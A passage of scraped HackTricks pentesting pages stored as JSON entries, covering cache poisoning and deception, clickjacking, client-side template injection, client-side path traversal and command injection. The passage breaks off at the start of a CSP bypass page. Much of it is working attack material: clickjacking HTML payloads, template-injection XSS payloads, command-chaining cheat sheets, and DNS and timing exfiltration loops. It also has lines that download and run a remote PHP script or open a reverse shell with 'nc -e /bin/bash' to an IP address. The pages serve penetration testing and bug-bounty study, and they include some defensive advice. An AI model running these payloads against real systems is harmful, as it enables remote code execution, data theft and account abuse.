files from the attacker server:\n403 and Storage Buckets\nPreviously,\nCloudflare\nused to\ncache\nthe\n403 responses\n, therefore sending\nbad Authorization\nheaders trying to access\nS3\nor\nAzure Storage Blobs\nexposed will return a 403 that will be cached. Cloudflare no longer caches 403 responses but this might work with other proxies.\nInjecting Keyed Parameters\nQuite often, caches are configured to\nonly include specific GET parameters in the cache key\n.\nFor example, Fastly using Varnish\ncached the\nsize\nparameter\nin the request but if you sent\nalso\nthe\nsiz%65\nparameter with a bad value, the\ncache key\nwas constructed with the\nwell written size param\n, but the\nbackend\nused the\nvalue inside the URL encoded param\n.\nURL encoding the second\nsize\nparameter caused it to be ignored by the cache, but used by the backend. Giving the parameter a value of 0 would result in a cacheable 400 Bad Request.\nUser Agent Rules\nDue to the high amount of traffic tools like FFUF or Nuclei generate, some developers decided to block requests matching their user-agents. Ironically, these tweaks can introduce unwanted cache poisoning and DoS opportunities.\nI found this worked on multiple targets, with user-agents from different tools or scanners.\nIllegal Header Fields\nThe header name format is defined in\nRFC7230\nas follows:\nIn theory, if a header name contains characters other than the ones listed in\ntchar\nit should be rejected with a 400 Bad request. In practice, however, servers don't always respect the RFC. The easiest way to exploit this nuance was by targeting Akamai which doesn't reject invalid headers, but forwards them and caches any 400 error as long the cache-control header is not present.\nSending a header containing an illegal character,\n\\\nwould cause a cacheable 400 Bad Request error. This was one of the most commonly identified patterns throughout my testing.\nFinding new headers\n‚Äã\nhttps://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6\n‚Äã\nCache Deception\nThe goal of Cache Deception is to make clients\nload resources that are going to be saved by the cache with their sensitive information\n.\nFirst of all note that\nextensions\nsuch as\n.css\n,\n.js\n,\n.png\netc are usually\nconfigured\nto be\nsaved\nin the\ncache.\nTherefore, if you access\nwww.example.com/profile.php/nonexistent.js\nthe cache will probably store the response because it sees the\n.js\nextension\n. But, if the\napplication\nis\nreplaying\nwith the\nsensitive\nuser contents stored in\nwww.example.com/profile.php\n, you can\nsteal\nthose contents from other users.\nOther things to test:\nwww.example.com/profile.php/.js\nwww.example.com/profile.php/.css\nwww.example.com/profile.php/test.js\nwww.example.com/profile.php/../test.js\nwww.example.com/profile.php/%2e%2e/test.js\nUse lesser known extensions such as\n.avif\nAnother very clear example can be found in this write-up:\nhttps://hackerone.com/reports/593712\n.\nIn the example, it is explained that if you load a non-existent page like\nhttp://www.example.com/home.php/non-existent.css\nthe content of\nhttp://www.example.com/home.php\n(\nwith the user's sensitive information\n) is going to be returned and the cache server is going to save the result.\nThen, the\nattacker\ncan access\nhttp://www.example.com/home.php/non-existent.css\nin their own browser and observe the\nconfidential information\nof the users that accessed before.\nNote that the\ncache proxy\nshould be\nconfigured\nto\ncache\nfiles\nbased\non the\nextension\nof the file (\n.css\n) and not base on the content-type. In the example\nhttp://www.example.com/home.php/non-existent.css\nwill have a\ntext/html\ncontent-type instead of a\ntext/css\nmime type (which is the expected for a\n.css\nfile).\nLearn here about how to perform\nCache Deceptions attacks abusing HTTP Request Smuggling\n.\nReferences\n‚Äã\nhttps://portswigger.net/web-security/web-cache-poisoning\n‚Äã\n‚Äã\nhttps://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities\n‚Äã\n‚Äã\nhttps://hackerone.com/reports/593712\n‚Äã\n‚Äã\nhttps://youst.in/posts/cache-poisoning-at-scale/\n‚Äã\n‚Äã\nhttps://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nCaptcha Bypass\nNext\n- Pentesting Web\nClickjacking\nLast modified\n2mo ago"
    },
    {
        "title": "Clickjacking",
        "url": "https://book.hacktricks.xyz/pentesting-web/clickjacking",
        "text": "Clickjacking\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nWhat is Clickjacking\nClickjacking is an attack that\ntricks\na\nuser\ninto\nclicking\na webpage\nelement\nwhich is\ninvisible\nor disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online. (From\nhere\n).\nPrepopulate forms trick\nSometimes is possible to\nfill the value of fields of a form using GET parameters when loading a page\n. An attacker may abuse this behaviour to fill a form with arbitrary data and send the clickjacking payload so the user press the button Submit.\nPopulate form with Drag&Drop\nIf you need the user to\nfill a form\nbut you don't want to directly ask him to write some specific information (like the email and or specific password that you know), you can just ask him to\nDrag&Drop\nsomething that will write your controlled data like in\nthis example\n.\nBasic Payload\n<\nstyle\n>\niframe\n{\nposition\n:\nrelative\n;\nwidth\n:\n500px\n;\nheight\n:\n700px\n;\nopacity\n:\n0.1\n;\nz-index\n:\n2\n;\n}\ndiv\n{\nposition\n:\nabsolute\n;\ntop\n:\n470px\n;\nleft\n:\n60px\n;\nz-index\n:\n1\n;\n}\n</\nstyle\n>\n<\ndiv\n>\nClick me\n</\ndiv\n>\n<\niframe\nsrc\n=\n\"\nhttps://vulnerable.com/\n[email¬†protected]\n\"\n>\n</\niframe\n>\nMultistep Payload\n<\nstyle\n>\niframe\n{\nposition\n:\nrelative\n;\nwidth\n:\n500px\n;\nheight\n:\n500px\n;\nopacity\n:\n0.1\n;\nz-index\n:\n2\n;\n}\n.firstClick, .secondClick\n{\nposition\n:\nabsolute\n;\ntop\n:\n330px\n;\nleft\n:\n60px\n;\nz-index\n:\n1\n;\n}\n.secondClick\n{\nleft\n:\n210px\n;\n}\n</\nstyle\n>\n<\ndiv\nclass\n=\n\"\nfirstClick\n\"\n>\nClick me first\n</\ndiv\n>\n<\ndiv\nclass\n=\n\"\nsecondClick\n\"\n>\nClick me next\n</\ndiv\n>\n<\niframe\nsrc\n=\n\"\nhttps://vulnerable.net/account\n\"\n>\n</\niframe\n>\nDrag&Drop + Click payload\n<\nhtml\n>\n<\nhead\n>\n<\nstyle\n>\n#payload\n{\nposition\n:\nabsolute\n;\ntop\n:\n20px\n;\n}\niframe\n{\nwidth\n:\n1000px\n;\nheight\n:\n675px\n;\nborder\n:\nnone\n;\n}\n.xss\n{\nposition\n:\nfixed\n;\nbackground\n:\n#F00\n;\n}\n</\nstyle\n>\n</\nhead\n>\n<\nbody\n>\n<\ndiv\nstyle\n=\n\"\nheight\n:\n26px\n;\nwidth\n:\n250px\n;\nleft\n:\n41.5%\n;\ntop\n:\n340px\n;\n\"\nclass\n=\n\"\nxss\n\"\n>\n.\n</\ndiv\n>\n<\ndiv\nstyle\n=\n\"\nheight\n:\n26px\n;\nwidth\n:\n50px\n;\nleft\n:\n32%\n;\ntop\n:\n327px\n;\nbackground\n:\n#F8F\n;\n\"\nclass\n=\n\"\nxss\n\"\n>\n1. Click and press delete button\n</\ndiv\n>\n<\ndiv\nstyle\n=\n\"\nheight\n:\n30px\n;\nwidth\n:\n50px\n;\nleft\n:\n60%\n;\nbottom\n:\n40px\n;\nbackground\n:\n#F5F\n;\n\"\nclass\n=\n\"\nxss\n\"\n>\n3.Click me\n</\ndiv\n>\n<\niframe\nsandbox\n=\n\"\nallow-modals allow-popups allow-forms allow-same-origin allow-scripts\n\"\nstyle\n=\n\"\nopacity\n:\n0.3\n\"\nsrc\n=\n\"\nhttps://target.com/panel/administration/profile/\n\"\n>\n</\niframe\n>\n<\ndiv\nid\n=\n\"\npayload\n\"\ndraggable\n=\n\"\ntrue\n\"\nondragstart\n=\n\"\nevent.dataTransfer.setData('text/plain', '\n[email¬†protected]\n')\n\"\n>\n<\nh3\n>\n2.DRAG ME TO THE RED BOX\n</\nh3\n>\n</\ndiv\n>\n</\nbody\n>\n</\nhtml\n>\nXSS + Clickjacking\nIf you have identified an\nXSS attack that requires a user to click\non some element to\ntrigger\nthe XSS and the page is\nvulnerable to clickjacking\n, you could abuse it to trick the user into clicking the button/link.\nExample:\nYou found a\nself XSS\nin some private details of the account (details that\nonly you can set and read\n). The page with the\nform\nto set these details is\nvulnerable\nto\nClickjacking\nand you can\nprepopulate\nthe\nform\nwith the GET parameters.\n__An attacker could prepare a\nClickjacking\nattack to that page\nprepopulating\nthe\nform\nwith the\nXSS payload\nand\ntricking\nthe\nuser\ninto\nSubmit\nthe form. So,\nwhen the form is submitted\nand the values are modified, the\nuser will execute the XSS\n.\nHow to avoid Clickjacking\nClient side defences\nIt's possible to execute scripts on the client side that perform some or all of the following behaviours to prevent Clickjacking:\ncheck and enforce that the current application window is the main or top window,\nmake all frames visible,\nprevent clicking on invisible frames,\nintercept and flag potential clickjacking attacks on a user.\nBypass\nAs frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the\nHTML5 iframe\nsandbox\nattribute\n. When this is set with the\nallow-forms\nor\nallow-scripts\nvalues and the\nallow-top-navigation\nvalue is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:\n<\niframe\nid\n=\n\"\nvictim_website\n\"\nsrc\n=\n\"\nhttps://victim-website.com\n\"\nsandbox\n=\n\"\nallow-forms allow-scripts\n\"\n>\n</\niframe\n>\nBoth the\nallow-forms\nand\nallow-scripts\nvalues permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviours while allowing functionality within the targeted site.\nDepending on the type of Clickjacking attack performed\nyou may also need to allow\n:\nallow-same-origin\nand\nallow-modals\nor\neven more\n. When preparing the attack just check the console of the browser, it may tell you which other behaviours you need to allow.\nX-Frame-Options\nThe\nX-Frame-Options\nHTTP response header\ncan be used to indicate whether or not a browser should be\nallowed\nto render a page in a\n<frame>\nor\n<iframe>\n. Sites can use this to avoid Clickjacking attacks, by ensuring that\ntheir content is not embedded into other sites\n. Set the\nX-Frame-Options\nheader for all responses containing HTML content. The possible values are:\nX-Frame-Options: deny\nwhich\nprevents any domain from framing the content\n(Recommended value)\nX-Frame-Options: sameorigin\nwhich only\nallows the current site\nto frame the content.\nX-Frame-Options: allow-from https://trusted.com\nwhich\npermits the specified 'uri'\nto frame this page.\nCheck limitations below because\nthis will fail open if the browser does not support it\n.\nOther browsers support the new\nCSP frame-ancestors directive instead\n. A few support both.\nContent Security Policy (CSP) frame-ancestors directive\nThe\nrecommended clickjacking protection\nis to incorporate the\nframe-ancestors\ndirective\nin the application's Content Security Policy.\nThe\nframe-ancestors 'none'\ndirective is similar in behaviour to the\nX-Frame-Options\ndeny\ndirective (\nNo-one can frame the page\n).\nThe\nframe-ancestors 'self'\ndirective is broadly equivalent to the\nX-Frame-Options\nsameorigin\ndirective (\nonly current site can frame it\n).\nThe\nframe-ancestors trusted.com\ndirective is broadly equivalent to the\nX-Frame-Options\nallow-from\ndirective (\nonly trusted site can frame it\n).\nThe following CSP whitelists frames to the same domain only:\nContent-Security-Policy: frame-ancestors 'self';\nSee the following documentation for further details and more complex examples:\n‚Äã\nhttps://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors\n‚Äã\n‚Äã\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors\n‚Äã\nLimitations\nBrowser support:\nCSP frame-ancestors are not supported by all the major browsers yet.\nX-Frame-Options takes priority:\nSection \"Relation to X-Frame-Options\" of the CSP Spec\nsays: \"\nIf a resource is delivered with a policy that includes a directive named frame-ancestors and whose disposition is \"enforce\", then the X-Frame-Options header MUST be ignored\n\", but Chrome 40 & Firefox 35 ignore the frame-ancestors directive and follow the X-Frame-Options header instead.\nReferences\n‚Äã\nhttps://portswigger.net/web-security/clickjacking\n‚Äã\n‚Äã\nhttps://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nCache Poisoning and Cache Deception\nNext\n- Pentesting Web\nClient Side Template Injection (CSTI)\nLast modified\n2mo ago"
    },
    {
        "title": "Client Side Template Injection (CSTI)",
        "url": "https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti",
        "text": "Client Side Template Injection (CSTI)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nSummary\nIt is like a\nServer Side Template Injection\nbut in the\nclient\n. The\nSSTI\ncan allow you to\nexecute code\non the remote server, the\nCSTI\ncould allow you to\nexecute arbitrary JavaScript\ncode in the victim.\nThe way to\ntest\nfor this vulnerability is very\nsimilar\nas in the case of\nSSTI\n, the interpreter is going to expect something to execute\nbetween doubles keys\nand will execute it. For example using something like:\n{{ 7-7 }}\nif the server is\nvulnerable\nyou will see a\n0\nand if not you will see the original:\n{{ 7-7 }}\nAngularJS\nAngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the\nng-app\nattribute (also known as an AngularJS directive). When a directive is added to the HTML code,\nyou can execute JavaScript expressions within double curly braces\n.\nFor example, if your\ninput\nis being\nreflected\ninside the\nbody\nof the HTML and the body is defined with\nng-app\n:\n<body ng-app>\nYou can\nexecute arbitrary JavaScript\ncode using curly braces\nadding\nto the\nbody\n:\n{{\n$on\n.\nconstructor\n(\n'alert(1)'\n)()}}\n{{\nconstructor\n.\nconstructor\n(\n'alert(1)'\n)()}}\n<\ninput ng\n-\nfocus\n=\n$event\n.\nview\n.\nalert\n(\n'XSS'\n)\n>\n‚Äã\n<!--\nGoogle Research\n-\nAngularJS\n-->\n<\ndiv ng\n-\napp ng\n-\ncsp\n><\ntextarea autofocus ng\n-\nfocus\n=\n\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'\"\n></\ntextarea\n></\ndiv\n>\nYou can find a very\nbasic online example\nof the vulnerability in\nAngularJS\nin\nhttp://jsfiddle.net/2zs2yv7o/\n‚Äã\n‚Äã\nAngular 1.6 removed the sandbox\nso from this version a payload like\n{{constructor.constructor('alert(1)')()}}\nor\n<input ng-focus=$event.view.alert('XSS')>\nshould work.\nVueJS\nYou can find a\nvulnerable vue.js\nimplementation in\nhttps://vue-client-side-template-injection-example.azu.now.sh/\nWorking payload:\nhttps://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%\n‚Äã\nAnd the\nsource code\nof the vulnerable example here:\nhttps://github.com/azu/vue-client-side-template-injection-example\n‚Äã\n<!-- Google Research - Vue.js-->\n\">\n<\ndiv\nv-html\n=\n\"''\n.constructor.constructor('d=document;d.location.hash.match(\\'x1\\') ? `` : d.location=`//localhost/mH`')()\n\"\n>\naaa\n</\ndiv\n>\nA really good post on CSTI in VUE can be found in\nhttps://portswigger.net/research/evading-defences-using-vuejs-script-gadgets\n‚Äã\nV3\n{{_openBlock.constructor('alert(1)')()}}\nCredit:\nGareth Heyes, Lewis Ardern & PwnFunction\n‚Äã\nV2\n{{constructor.constructor('alert(1)')()}}\nCredit:\nMario Heiderich\n‚Äã\nCheck more VUE payloads in\nhttps://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected\n‚Äã\nMavo\nPayload:\n[7*7]\n[(1,alert)(1)]\n<div mv-expressions=\"{{ }}\">{{top.alert(1)}}</div>\n[self.alert(1)]\njavascript:alert(1)%252f%252f..%252fcss-images\n[Omglol mod 1 mod self.alert (1) andlol]\n[''=''or self.alert(lol)]\n<a data-mv-if='1 or self.alert(1)'>test</a>\n<div data-mv-expressions=\"lolx lolx\">lolxself.alert('lol')lolx</div>\n<a href=[javascript&':alert(1)']>test</a>\n[self.alert(1)mod1]\nMore payloads in\nhttps://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations\n‚Äã\nBrute-Force Detection List\nAuto_Wordlists/ssti.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nClickjacking\nNext\n- Pentesting Web\nClient Side Path Traversal\nLast modified\n6mo ago"
    },
    {
        "title": "Client Side Path Traversal",
        "url": "https://book.hacktricks.xyz/pentesting-web/client-side-path-traversal",
        "text": "Client Side Path Traversal\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nA client side path traversal occurs when you can\nmanipulate the path of a URL\nthat is going to be\nsent to a user to visit in a legit way\nor that a user is somehow going to be\nforced to visit for example via JS or CSS\n.\nIn\nthis writeup\n, it was possible to\nchange the invite URL\nso it would end up\ncanceling a card\n.\nIn\nthis writeup\n, it was possible to combine a\nclient side path traversal via CSS\n(it was possible to change the path where a CSS resource was loaded from) with an\nopen redirect\nto load the CSS resource from an\nattacker controlled domain\n.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nClient Side Template Injection (CSTI)\nNext\n- Pentesting Web\nCommand Injection\nLast modified\n6mo ago"
    },
    {
        "title": "Command Injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/command-injection",
        "text": "Command Injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nWhat is command Injection?\nOS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute an arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. (From\nhere\n).\nContext\nDepending on\nwhere your input is being injected\nyou may need to\nterminate the quoted context\n(using\n\"\nor\n'\n) before the commands.\nCommand Injection/Execution\n#Both Unix and Windows supported\nls\n||\nid\n;\nls\n||\nid\n;\nls\n||\nid\n;\nls\n||\nid\n# Execute both\nls\n|\nid\n;\nls\n|\nid\n;\nls\n|\nid\n;\nls\n|\nid\n# Execute both (using a pipe)\nls\n&&\nid\n;\nls\n&&\nid\n;\nls\n&&\nid\n;\nls\n&&\nid\n#  Execute 2¬∫ if 1¬∫ finish ok\nls\n&\nid\n;\nls\n&\nid\n;\nls\n&\nid\n;\nls\n&\nid\n# Execute both but you can only see the output of the 2¬∫\nls\n%0A\nid\n# %0A Execute both (RECOMMENDED)\n‚Äã\n#Only unix supported\n`\nls\n`\n# ``\n$(\nls\n)\n# $()\nls\n;\nid\n# ; Chain commands\nls\n${\nLS_COLORS\n:\n10\n:\n1}${\nIFS\n}\nid\n# Might be useful\n‚Äã\n#Not executed but may be interesting\n>\n/var/www/html/out.txt\n#Try to redirect the output to a file\n<\n/etc/passwd\n#Try to send some input to the command\nLimition\nBypasses\nIf you are trying to execute\narbitrary commands inside a linux machine\nyou will be interested to read about this\nBypasses:\nBypass Linux Restrictions\nExamples\nvuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php\nvuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80\nvuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay\nParameters\nHere are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities (from\nlink\n):\n?cmd={payload}\n?exec={payload}\n?command={payload}\n?execute{payload}\n?ping={payload}\n?query={payload}\n?jump={payload}\n?code={payload}\n?reg={payload}\n?do={payload}\n?func={payload}\n?arg={payload}\n?option={payload}\n?load={payload}\n?process={payload}\n?step={payload}\n?read={payload}\n?function={payload}\n?req={payload}\n?feature={payload}\n?exe={payload}\n?module={payload}\n?payload={payload}\n?run={payload}\n?print={payload}\nTime based data exfiltration\nExtracting data: char by char\nswissky@crashlab‚ñ∏ ~ ‚ñ∏ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi\nreal    0m5.007s\nuser    0m0.000s\nsys 0m0.000s\n‚Äã\nswissky@crashlab‚ñ∏ ~ ‚ñ∏ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi\nreal    0m0.002s\nuser    0m0.000s\nsys 0m0.000s\nDNS based data exfiltration\nBased on the tool from\nhttps://github.com/HoLyVieR/dnsbin\nalso hosted at dnsbin.zhack.ca\n1. Go to http://dnsbin.zhack.ca/\n2. Execute a simple 'ls'\nfor i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done\n$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)\nOnline tools to check for DNS based data exfiltration:\ndnsbin.zhack.ca\npingb.in\nFiltering bypass\nWindows\npowershell C:**2\\n??e*d.*? # notepad\n@^p^o^w^e^r^shell c:**32\\c*?c.e?e # calc\nLinux\nBypass Linux Restrictions\nBrute-Force Detection List\nAuto_Wordlists/command_injection.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nReferences\nPayloadsAllTheThings/Command Injection at master ¬∑ swisskyrepo/PayloadsAllTheThings\nGitHub\nWhat is OS command injection, and how to prevent it? | Web Security Academy\nWebSecAcademy\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPentesting Web -\nPrevious\nClient Side Path Traversal\nNext\n- Pentesting Web\nContent Security Policy (CSP) Bypass\nLast modified\n2mo ago"
    },
    {
        "title": "Content Security Policy (CSP) Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass",
        "text": "Content Security Policy (CSP) Bypass\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nWhat is CSP\nContent Security Policy or CSP is 